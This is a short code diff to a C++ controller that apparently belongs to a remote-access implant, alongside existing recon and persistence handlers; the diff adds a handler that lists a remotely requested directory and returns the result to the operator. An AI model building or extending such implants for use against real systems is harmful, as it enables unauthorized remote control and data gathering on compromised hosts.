@@ -1,6 +1,7 @@
 #include "Controller.h"
 #include "utils.h"
 #include "Recon.h"
+#include "DirectoryListing.h"
 
 #include <iostream> // TODO: delete later?
 #include <sstream>
@@ -297,3 +298,19 @@ void Controller::handleEstablishPersistence(const InternalMessage& msg)
 
 }
 
+
+void Controller::handleListDirectory(const InternalMessage& msg)
+{
+    InternalMessage response;
+    response.header_.messageId_ = msg.header_.messageId_;
+    try {
+        const std::string path(msg.data_.begin(), msg.data_.end());
+        response.data_ = string2byte(directory_listing::list(path));
+        response.header_.messageType_ = MessageType::DIRECTORY_LISTING;
+    } catch (const std::exception& error) {
+        response.header_.messageType_ = MessageType::ERROR_REPORT;
+        response.data_ = string2byte(std::string("Directory listing failed: ") + error.what());
+    }
+    response.header_.dataSize_ = static_cast<uint32_t>(response.data_.size());
+    messageHandler_->sendMessage(response);
+}
